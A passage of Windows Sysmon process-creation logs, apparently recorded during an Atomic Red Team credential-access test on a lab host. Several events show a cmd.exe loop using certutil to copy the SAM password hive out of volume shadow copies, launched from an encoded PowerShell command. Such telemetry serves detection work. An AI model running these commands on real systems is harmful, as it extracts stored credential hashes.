Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.779334800Z'/><EventRecordID>1621</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.776</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-bd06-000000007003}</Data><Data Name='ProcessId'>484</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss5 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.699041700Z'/><EventRecordID>1620</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.697</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-bc06-000000007003}</Data><Data Name='ProcessId'>3832</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss4 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.659622800Z'/><EventRecordID>1619</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.658</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-bb06-000000007003}</Data><Data Name='ProcessId'>3580</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss3 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.623471200Z'/><EventRecordID>1618</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.622</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-ba06-000000007003}</Data><Data Name='ProcessId'>5016</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss2 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.534772700Z'/><EventRecordID>1617</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.495</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-b906-000000007003}</Data><Data Name='ProcessId'>2744</Data><Data Name='Image'>C:\Windows\System32\certutil.exe</Data><Data Name='FileVersion'>10.0.17763.5696 (WinBuild.160101.0800)</Data><Data Name='Description'>CertUtil.exe</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>CertUtil.exe</Data><Data Name='CommandLine'>certutil  -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" C:\Users\ADMINI~1\AppData\Local\Temp\SAMvss1 2 </Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=E53CE0751C3D4C884A5FFF753462EFFA,SHA256=98D63F0F44C8AFAF1A4B11E38E92F81ADD7F59FD1FF7B296FC3D40C7F0094177,IMPHASH=683B8A445B00A271FC57848D893BD6C4</Data><Data Name='ParentProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ParentProcessId'>4436</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>"cmd.exe" /c for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %temp%\SAMvss*</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2025-11-03T09:44:44.426259800Z'/><EventRecordID>1616</EventRecordID><Correlation/><Execution ProcessID='2712' ThreadID='3468'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>ar-win-1</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2025-11-03 09:44:44.425</Data><Data Name='ProcessGuid'>{506a9d8f-798c-6908-b706-000000007003}</Data><Data Name='ProcessId'>4436</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.17763.1697 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>"cmd.exe" /c for /L %%a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%%a\Windows\System32\config\SAM" %%temp%%\SAMvss%%a 2 &gt;nul 2&gt;&amp;1) &amp; dir /B %%temp%%\SAMvss*</Data><Data Name='CurrentDirectory'>C:\Users\ADMINI~1\AppData\Local\Temp\</Data><Data Name='User'>AR-WIN-1\Administrator</Data><Data Name='LogonGuid'>{506a9d8f-797d-6908-16d9-240000000000}</Data><Data Name='LogonId'>0x24d916</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=911D039E71583A07320B32BDE22F8E22,SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{506a9d8f-7980-6908-9306-000000007003}</Data><Data Name='ParentProcessId'>3528</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"powershell.exe" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIABTAGUAdAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAYgB5AHAAYQBzAHMACgBJAG0AcABvAHIAdAAtAE0AbwBkAHUAbABlACAAIgBDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAaQBuAHYAbwBrAGUALQBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAFwASQBuAHYAbwBrAGUALQBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAC4AcABzAGQAMQAiACAALQBGAG8AcgBjAGUACgBJAG4AdgBvAGsAZQAtAEEAdABvAG0AaQBjAFQAZQBzAHQAIAAiAFQAMQAwADAAMwAuADAAMAAyACIAIAAtAEMAbwBuAGYAaQByAG0AOgAkAGYAYQBsAHMAZQAgAC0AVABpAG0AZQBvAHUAdABTAGUAYwBvAG4AZABzACAAMwAwADAAIAAtAEUAeABlAGMAdQB0AGkAbwBuAEwAbwBnAFAAYQB0AGgAIABDADoAXABBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFwAYQB0AGMAXwBlAHgAZQBjAHUAdABpAG8AbgAuAGMAcwB2AA==</Data><Data Name='ParentUser'>AR-WIN-1\Administrator</Data></EventData></Event>
